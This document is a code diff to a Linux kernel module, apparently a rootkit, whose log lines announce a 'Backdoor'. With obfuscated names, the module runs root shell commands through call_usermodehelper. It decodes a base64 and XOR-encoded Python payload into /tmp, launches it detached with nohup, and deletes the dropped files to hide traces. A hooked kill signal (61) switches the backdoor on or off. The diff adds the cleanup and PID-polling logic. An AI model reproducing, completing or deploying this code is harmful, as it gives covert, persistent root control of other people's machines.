@@ -12,6 +12,7 @@
 #include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/cred.h>
+#include <linux/delay.h>
 #include "ft_help.h"
 
 MODULE_LICENSE("GPL");
@@ -35,6 +36,21 @@ bool ldksjeushd(const char *path) {
     }
     filp_close(file, NULL);
     return true;
+}
+
+void ahsgehdbsj(const char *filepath) {
+    char *argv[] = { "/bin/bash", "-c", NULL, NULL };
+    char cmd[256];
+    int ret;
+
+    snprintf(cmd, sizeof(cmd), "rm -f %s", filepath);
+    argv[2] = cmd;
+
+    ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+
+    if(ret == 0){
+        printk(KERN_INFO "mob: [INFO] File Deleted %s\n", filepath);
+    }
 }
 
 void hajsndjems(void){
@@ -70,7 +86,7 @@ void heuhsjalso(void){
 
 void idjehsndhs(void){
 
-    char *argv[] = { "/bin/bash", "-c", "ps aux | grep 'hsjajsnsjd.py' | grep -v 'grep' | awk '{print $2}' > /tmp/dheysgdbah.txt", NULL };
+    char *argv[] = { "/bin/bash", "-c", "ps aux | grep 'hsjajsnsjd' | grep -v 'grep' | awk '{print $2}' > /tmp/dheysgdbah.txt", NULL };
     static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
     
     struct file *file;
@@ -80,11 +96,13 @@ void idjehsndhs(void){
 
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (ret != 0) {
+        printk(KERN_ERR "mob: [ERROR] Error checking the process\n");
         return;
     }
 
     file = filp_open("/tmp/dheysgdbah.txt", O_RDONLY, 0);
     if (IS_ERR(file)) {
+        printk(KERN_ERR "Failed to open file, error: %ld\n", PTR_ERR(file));
         return;
     }
 
@@ -95,7 +113,11 @@ void idjehsndhs(void){
         ret = kstrtoint(buf, 10, &shajshejxn);
         if (ret < 0) {
             shajshejxn = -1;
+        } else {
+            printk(KERN_INFO "mob: [INFO] Retrieved PID: %d\n", shajshejxn);
         }
+    } else {
+        printk(KERN_ERR "mob: [ERROR] Failed to read PID from /tmp/dheysgdbah.txt\n");
     }
 }
 
@@ -111,7 +133,6 @@ int jdkelskjds(const char *filepath, char *data) {
         return PTR_ERR(file);
     }
 
-    // Write the data in a loop to handle partial writes
     while (written < data_size) {
         ret = kernel_write(file, data + written, data_size - written, &pos);
         if (ret < 0) {
@@ -125,10 +146,22 @@ int jdkelskjds(const char *filepath, char *data) {
     return (written == data_size) ? 0 : -EIO;
 }
 
+// // Delete Encoded file
+// int ahsgehdbsj(void){
+
+//     char *argv[] = { "/bin/bash", "-c", "rm -f /tmp/ahsjendhah.txt", NULL };
+//     static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
+//     int ret;
+
+//     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
+//     return 0;
+// }
+
 
 int uehsjdnshd(void){
 
-    char *argv[] = { "/bin/bash", "-c", "echo 'aW1wb3J0IGJhc2U2NAp3aXRoIG9wZW4oJy90bXAvYWhzamVuZGhhaC50eHQnLCAncmInKSBhcyBmOgogICAgdHJnZWhqZGtlbCA9IGYucmVhZCgpCmtleSA9IDB4NUEKaHNuZHV0aWVsYSA9IGJ5dGVzKFtiIF4ga2V5IGZvciBiIGluIHRyZ2VoamRrZWxdKQp0cnk6CiAgICBoc25haHNuZWpkID0gYmFzZTY0LmI2NGRlY29kZShoc25kdXRpZWxhKS5kZWNvZGUoJ3V0Zi04JykKICAgIHdpdGggb3BlbignL3RtcC9oc2phanNuc2pkLnB5JywgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoaHNuYWhzbmVqZCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJcGFzcwo=' | base64 -d > /tmp/dheysjdnsj.py && python3 /tmp/dheysjdnsj.py & rm -f /tmp/dheysjdnsj.py", NULL };
+    char *argv[] = { "/bin/bash", "-c", "echo 'aW1wb3J0IGJhc2U2NAp3aXRoIG9wZW4oJy90bXAvYWhzamVuZGhhaC50eHQnLCAncmInKSBhcyBmOgogICAgdHJnZWhqZGtlbCA9IGYucmVhZCgpCmtleSA9IDB4NUEKaHNuZHV0aWVsYSA9IGJ5dGVzKFtiIF4ga2V5IGZvciBiIGluIHRyZ2VoamRrZWxdKQp0cnk6CiAgICBoc25haHNuZWpkID0gYmFzZTY0LmI2NGRlY29kZShoc25kdXRpZWxhKS5kZWNvZGUoJ3V0Zi04JykKICAgIHdpdGggb3BlbignL3RtcC9oc2phanNuc2pkLnB5JywgJ3cnKSBhcyBmOgogICAgICAgIGYud3JpdGUoaHNuYWhzbmVqZCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoJcGFzcwo=' | base64 -d > /tmp/dheysjdnsj.py && exec python3 /tmp/dheysjdnsj.py > decoderlog.txt 2>&1", NULL };
     static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
     int ret;
 
@@ -139,14 +172,29 @@ int uehsjdnshd(void){
 
 int jdkepflfks(void){
 
-    char *argv[] = { "/bin/bash", "-c", "python3 /tmp/hsjajsnsjd.py & rm -f /tmp/hsjajsnsjd.py", NULL };
+    char *argv[] = { "/bin/bash", "-c", "nohup python3 /tmp/hsjajsnsjd.py > /dev/null 2>&1 & disown", NULL };
     static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
     int ret;
+    int processcheckercount = 0;
 
     ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if (ret == 0) {
         idjehsndhs();
         printk(KERN_INFO "mob: [INFO] Backdoor Initiated...\n");
+        
+        while ((shajshejxn == -1) || (processcheckercount == 10)){
+            ssleep(2);
+            idjehsndhs();
+            processcheckercount++;
+            printk(KERN_INFO "mob: [INFO] Checking for Process ID loop: %d\n", processcheckercount);
+        }
+
+        printk(KERN_INFO "mob: [INFO] 0 Payload PID: %d\n", shajshejxn);
+    }
+
+    if (ldksjeushd(JSHDNEJSNA)){
+        ahsgehdbsj(JSHDNEJSNA);
+        printk(KERN_INFO "mob: [INFO] Encoded File Deleted\n");
     }
 
     return 0;
@@ -159,17 +207,39 @@ void uwhanslajs(void) {
         return;
     }
 
+    idjehsndhs();
+
     for_each_process(task) {
         if (task->pid == shajshejxn) {
             send_sig(SIGKILL, task, 1);
             shajshejxn = -1;
             return;
-        } else {
-            printk(KERN_INFO "mob: [INFO] Backdoor Removed...\n");
         }
     }
 
+    printk(KERN_INFO "mob: [INFO] Backdoor Removed...\n");
+
     shajshejxn = -1;
+}
+
+
+void oehjdpajek(void){
+    if (jdkelskjds(JSHDNEJSNA, shdjensjdm) >= 0) {           
+        uehsjdnshd(); // execute decoder
+        ssleep(7);
+        ahsgehdbsj("/tmp/dheysjdnsj.py"); // remove encoded file
+
+        if (ldksjeushd(HAJSNEJDNF)){
+            jdkepflfks(); // execute payload
+            ssleep(7);
+            ahsgehdbsj(HAJSNEJDNF); // remove payload file
+            printk(KERN_INFO "mob: [INFO] 4 Payload PID: %d\n", shajshejxn);
+        } else {
+            printk(KERN_INFO "mob: [INFO] 5 Payload PID: %d\n", shajshejxn);
+        }
+    } else {
+        printk(KERN_INFO "mob: [INFO] 8 Payload PID: %d\n", shajshejxn);
+    }
 }
 
 
@@ -196,13 +266,10 @@ asmlinkage int ghsjdkensj(struct ftrace_regs *regs) {
     
     if (sig == 61) {
         if (shajshejxn == -1) {
-            if (!ldksjeushd(HAJSNEJDNF)) {
-                uehsjdnshd();
-            } else {
-                jdkepflfks();
-            }
+            oehjdpajek();
         } else {
             uwhanslajs();
+            printk(KERN_INFO "mob: [INFO] 3 Payload PID: %d\n", shajshejxn);
         }
         return 0;
     } else if (sig == 64){
@@ -234,12 +301,7 @@ static int __init mob_module_init(void) {
     }
     printk(KERN_INFO "mob: [INFO] Module loaded\n");
 
-    if (jdkelskjds(JSHDNEJSNA, shdjensjdm) >= 0) {
-            
-        uehsjdnshd();
-
-        jdkepflfks();
-    }
+    oehjdpajek();
 
     return 0;
 }
